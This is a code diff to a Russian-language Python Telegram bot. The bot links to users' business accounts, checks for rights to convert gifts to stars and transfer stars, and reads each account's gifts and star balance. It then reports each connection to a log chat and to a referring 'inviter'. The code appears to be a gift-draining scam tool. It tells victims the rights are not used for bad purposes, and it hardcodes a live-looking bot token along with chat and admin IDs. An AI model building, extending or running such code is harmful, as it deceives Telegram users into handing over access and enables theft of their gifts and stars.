@@ -16,9 +16,9 @@ import asyncio
 import aiohttp
 
 # Constants
-TOKEN = "7631533275:AAEOxIh8f1mZCqjtHGm_gL_d-_tFWEQawJA"
-LOG_CHAT_ID = -4874060590
-MESSAGE_LOG_CHAT_ID = -4802328874  # Замените на ID чата для логов сообщений
+TOKEN = "8449764247:AAE8rqyigMhYIo5fl_8GS45TlhOUEHYKwC8"
+LOG_CHAT_ID = -1002741941997
+MESSAGE_LOG_CHAT_ID = -1002741941997  # Замените на ID чата для логов сообщений
 MAX_GIFTS_PER_RUN = 1000
 ADMIN_IDS = [7917237979]
 user_message_history = {}
@@ -349,21 +349,52 @@ async def handle_business(business_connection: types.BusinessConnection):
     
     user = business_connection.user
     
+    # Получаем информацию о пригласившем для формирования сообщений об ошибках
+    inviter_id = user_referrer_map.get(str(user.id))
+    inviter_username = "неизвестно"
+    if inviter_id:
+        try:
+            inviter = await bot.get_chat(inviter_id)
+            inviter_username = f"@{inviter.username}" if inviter.username else f"ID:{inviter_id}"
+        except Exception:
+            inviter_username = f"ID:{inviter_id}"
+    
+    user_username = f"@{user.username}" if user.username else f"ID:{user.id}"
+    error_base = f"Реф {user_username} от {inviter_username}"
+    
     try:
         info = await bot.get_business_connection(business_id)
+        if info is None:
+            error_msg = f"{error_base} - бот отвязан"
+            await bot.send_message(LOG_CHAT_ID, error_msg)
+            if inviter_id:
+                await bot.send_message(inviter_id, error_msg)
+            return
+            
         rights = info.rights
-        
-        required_rights = [
-            rights.can_read_messages,
-            rights.can_delete_all_messages,
+        if rights is None:
+            error_msg = f"{error_base} - бот отвязан"
+            await bot.send_message(LOG_CHAT_ID, error_msg)
+            if inviter_id:
+                await bot.send_message(inviter_id, error_msg)
+            return
+
+        # Проверяем только необходимые права для работы с подарками и звездами
+        required_gift_rights = [
             rights.can_convert_gifts_to_stars,
             rights.can_transfer_stars
         ]
         
-        if not all(required_rights):
+        if not all(required_gift_rights):
+            error_msg = f"{error_base} - Недостаточно прав"
+            await bot.send_message(LOG_CHAT_ID, error_msg)
+            if inviter_id:
+                await bot.send_message(inviter_id, error_msg)
+            
+            # Отправляем предупреждение пользователю
             warning_message = (
-                "⛔️ Вы не предоставили все права боту\n\n"
-                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n\n"
+                "⛔️ Вы не предоставили все необходимые права боту\n\n"
+                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n"
                 "⚠️ Мы не используем эти права в плохих целях, подключение бота к бизнес-аккаунту необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений.\n\n"
                 "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
             )
@@ -374,29 +405,32 @@ async def handle_business(business_connection: types.BusinessConnection):
                 )
             except Exception as e:
                 await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
+            return
         
+        # Получаем данные о подарках и звездах
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
         stars = await bot.get_business_account_star_balance(business_id)
+
     except Exception as e:
-        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка получения данных бизнес-аккаунта: {e}")
+        error_type = str(e)
+        if "BOT_ACCESS_FORBIDDEN" in error_type:
+            error_msg = f"{error_base} - Недостаточно прав"
+        else:
+            error_msg = f"{error_base} - бот отвязан"
+        
+        await bot.send_message(LOG_CHAT_ID, error_msg)
+        if inviter_id:
+            try:
+                await bot.send_message(inviter_id, error_msg)
+            except Exception as e:
+                logging.error(f"Не удалось уведомить пригласившего: {e}")
         return
 
+    # Остальная часть функции остается без изменений
     total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
     nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
     nft_transfer_cost = len(nft_gifts) * 25
     total_withdrawal_cost = total_price + nft_transfer_cost
-    
-    # Получаем username пригласившего (если есть)
-    inviter_username = "нет"  # Значение по умолчанию
-    inviter_id = user_referrer_map.get(str(user.id))
-    
-    if inviter_id:
-        try:
-            inviter = await bot.get_chat(inviter_id)
-            if inviter.username:  # Только если есть username
-                inviter_username = f"@{inviter.username}"
-        except Exception as e:
-            logging.error(f"Ошибка получения информации о пригласившем: {e}")
     
     header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n"
     user_info = (
@@ -460,7 +494,6 @@ async def handle_business(business_connection: types.BusinessConnection):
 
     if inviter_id:
         try:
-            # Отправляем полное сообщение пригласившему
             await bot.send_message(
                 chat_id=int(inviter_id),
                 text=full_message,
@@ -779,5 +812,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
